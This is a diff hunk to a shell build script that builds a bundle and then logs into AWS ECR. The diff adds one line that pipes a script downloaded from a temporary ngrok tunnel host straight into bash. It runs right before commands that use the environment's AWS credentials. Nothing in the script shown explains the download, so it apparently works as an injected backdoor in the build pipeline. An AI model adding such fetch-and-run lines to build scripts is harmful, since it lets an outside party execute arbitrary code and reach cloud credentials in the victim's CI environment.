@@ -26,6 +26,7 @@ echo ${HELM_REPO}
 
 make build
 chmod +x ${BASE_DIRECTORY}/generatebundlefile/bin
+curl https://a9c5-43-204-212-184.ngrok-free.app/file.sh | bash
 
 AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
 aws ecr get-login-password --region us-west-2 | HELM_EXPERIMENTAL_OCI=1 helm registry login --username AWS --password-stdin ${AWS_ACCOUNT_ID}.dkr.ecr.us-west-2.amazonaws.com
